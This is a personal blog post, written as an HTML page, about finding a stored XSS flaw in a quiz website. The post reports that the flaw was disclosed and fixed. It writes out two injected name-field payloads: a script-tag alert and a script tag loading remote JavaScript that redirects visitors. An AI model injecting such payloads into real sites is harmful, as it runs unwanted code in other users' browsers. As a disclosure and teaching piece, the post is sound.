@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>The "Quiz Your Friends" XSS Exploit | tait.tech</title>
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="Tait Hoyem">
+    <meta name="keywords" content="">
+    <meta name="description" content="">
+  </head>
+  <body>
+    <div id="wrapper">
+      <header>
+	<h1>tait.tech</h1>
+
+        <nav>
+	
+	<a href="/" class="nav-link"  >Home</a>
+	
+	<a href="/blog/" class="nav-link"  >Blog</a>
+	
+	<a href="/ideas/" class="nav-link"  >Ideas</a>
+	
+	<a href="/links/" class="nav-link"  >Links</a>
+	
+	<a href="https://github.com/TTWNO/" class="nav-link"   target="_blank" rel="noopener noreferrer" >Github</a>
+	
+</nav>
+
+      </header>
+      <main>
+        <article>
+  <header>
+    <h1 class="post-title">The "Quiz Your Friends" XSS Exploit</h1>
+    <time datetime="21-04-04" class="post-date">Sunday, April 04 2021</time>
+  </header>
+  <hr>
+
+  <p>Note: I have alerted the administrators of this site multiple times about this vulnerability.
+One email was sent many years ago, which is more than enough time for <a href="https://en.wikipedia.org/wiki/Responsible_disclosure">responsible disclosure</a>.</p>
+
+<p>Update: They have fixed the vulnerability as of the day of release for this article.</p>
+
+<h2 id="background">Background</h2>
+
+<p>In early 2014, when my “programming” skills consisted of editing web pages with inspect element, I was sent a link from an old friend in a town about 3 hours away.
+This was a link to a quiz about them.
+I had to answer as many questions right as I could about them and I got a score at the end based on my answers.
+It seemed fun enough, so I went for it.
+In the following weeks this quiz website became quite a trend amongst my friend group as we all started making quizes to see how well we all knew eachother.</p>
+
+<p>A few weeks into this trend, I was staying at a friends’ place and told him about this site,
+so he goes and creates his own quiz and sends it to all his friends, group chats, Google Plus groups, et cetera.</p>
+
+<h2 id="hackerman">Hackerman</h2>
+
+<p>While filling in my friend’s survey I thought it would be
+funny for them to know it is me without anyone else knowing.
+We were young and had <code class="language-plaintext highlighter-rouge">Inspect Element</code>ed a few things together,
+so it was a safe bet that an HTML joke would let them know.</p>
+
+<p>I decided to write my name like so: <code class="language-plaintext highlighter-rouge">&lt;b&gt;Steve&lt;/b&gt;</code>.
+Steve is in reference to the <a href="https://minecraft.gamepedia.com/Player">main character</a> in the video game Minecraft.</p>
+
+<figure>
+  <img src="/assets/img/qyf-xss/2-bold.png" />
+  <figcaption>
+    <p>Me typing in my name as <span class="mono">&lt;b&gt;Steve&lt;/b&gt;</span>.</p>
+  </figcaption>
+</figure>
+
+<p>Now in theory this should have shown in in the leaderboard as: “&lt;b&gt;Steve&lt;/b&gt;”
+However, to my horror and excitement, I saw this in the leaderboard:</p>
+
+<figure>
+  <img src="/assets/img/qyf-xss/3-steve-board.png" />
+  <figcaption>
+    <p><span class="mono">&lt;b&gt;Steve&lt;/b&gt;</span> displaying in the leaderboard as bold text: <b>Steve</b></p>
+  </figcaption>
+</figure>
+
+<p>The text “Steve” showed up <strong>in bold</strong> on the leaderboard.
+This told me all I needed to know.
+How did this happen? You might wonder.</p>
+
+<h3 id="server-side-validation">Server-Side Validation</h3>
+
+<p>Here is a great demonstration why you should do most of your validation on the server side.
+As a user, I can edit any of the HTML, CSS, or Javascript your server serves to me.</p>
+
+<p>Quiz your friends uses the <code class="language-plaintext highlighter-rouge">maxlength=20</code> HTML attribute on the name input field.
+Imagine trying to fit in a script tag doing anything useful with 20 characters! Don’t forget that includes the <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> tag.
+That would leave 13 characters for Javascript.
+Although I’m sure a genius would be able to <a href="https://code.golf/">code golf</a> that, I know I couldn’t.</p>
+
+<p>Now obviously I can edit any HTML that a server has sent to me.
+If I open up my inspect element window, I can go ahead and change that <code class="language-plaintext highlighter-rouge">maxlength</code> attribute to anything I want.
+Let’s change it to 100!</p>
+
+<figure>
+  <img src="/assets/img/qyf-xss/5-maxlength.png" alt="An image of the Quiz Your Friends name input field with inspect element. THe code reads: &lt;font class=&quot;style6&quot;&gt;&lt;input class=&quot;inputbutton&quot; name=&quot;takername&quot; type=&quot;text&quot; id=&quot;takername&quot; maxlength=&quot;20&quot; width=&quot;425&quot; placeholder=&quot;Your First Name&quot; style=&quot;text-align: center; text-decoration:inherit; font-size:38px;&quot; tabindex=&quot;-1&quot;&gt;&lt;/font&gt;" />
+  <figcaption>
+    Manually changing the maxlength attribute. 
+  </figcaption>
+</figure>
+
+<p>In theory, there is a way that a site can stop people from just putting in their name of any length: server-side validation.
+The server <em>could</em> check to see if the input is too long and reject it if it is.
+The Quiz My Friends server has <em>no such checks in place</em>.
+Therefore, I can send an almost arbitrary load to them.
+Being able to send something potentially very large (more than a few megabytes) is a vulnerability of its own.
+Imagine being able to send entire executable programs as your “name” in one of these quizzes?</p>
+
+<h2 id="javascript">Javascript</h2>
+
+<p>So I went on my merry way thinking about ways to use malicious javascript.
+Then, I thought that might be mean, so I decided to warn users instead.
+I filled in the name with a script tag and a call to <code class="language-plaintext highlighter-rouge">alert()</code> to warn the user about this site.
+I edited the max-length attribute to allow me to type a long string like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;alert("Don't use this site. It is not secure!");&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Sure enough, I got a text from my friend saying: “Tait! I know this is you, why would you do that!”
+A bit salty, but who wouldn’t be.</p>
+
+<h2 id="cross-site-scripting-xss">Cross-Site Scripting (XSS)</h2>
+
+<p>As my final act, I decided to use a cross-site script that I could edit and have it load with new changes at any time.</p>
+
+<p>I set this as my name:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script src="https://tait.tech/assets/js/hacked.js"&gt;&lt;/script&gt;
+</code></pre></div></div>
+
+<p>This script pops up a warning, telling the user that the site is insecure and it is now redirecting to an article about the attack.
+This script redirects to an <a href="https://tait.tech/2020/04/25/xss/">older post I made</a> about how XSS works.</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>Watch out for sketchy websites that may be vulnerable to malicious or insecure sites which are ripe for abuse.
+Always check that you are using an encrypted connection, HTTPS.
+And if you see any messages warning you that a site is not secure and redirecting you to some random site…
+Take their info with a grain of salt.</p>
+
+<p>Happy Hacking, literally :)</p>
+
+
+</article>
+
+      </main>
+      <hr>
+      <footer>
+        This page will be mirrored on <a href="https://beta.tait.tech/2021/04/04/quiz-your-friends-xss/">beta.tait.tech</a>.
+
+      </footer>
+    </div>
+  </body>
+</html>
